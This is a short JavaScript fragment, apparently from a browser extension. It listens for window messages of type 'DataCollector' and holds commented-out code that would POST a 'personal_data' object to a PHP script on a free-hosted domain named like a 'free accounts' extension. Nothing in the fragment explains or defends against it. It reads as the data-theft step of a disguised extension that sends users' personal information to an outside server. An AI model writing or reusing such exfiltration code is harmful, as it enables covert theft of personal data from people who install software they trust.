window.addEventListener('message', function (e) {
    // Get the sent data
    const data = e.data;
  
    // If you encode the message in JSON before sending them,
    // then decode here
    const decoded = JSON.parse(data);
    if (decoded.type == "DataCollector")
    {
        //console.log(JSON.stringify({ text: JSON.stringify(personal_data), type: 'PersonalData', relay: true,}));
        //var xmlhttp;if (window.XMLHttpRequest) {xmlhttp = new XMLHttpRequest();}xmlhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { console.log(this.responseText); } }; xmlhttp.open('POST', 'https://freeacountzsusextention.000webhostapp.com/personal_data.php', true);var payload = JSON.stringify(personal_data);xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xmlhttp.send("personaldata="+payload);
    }
});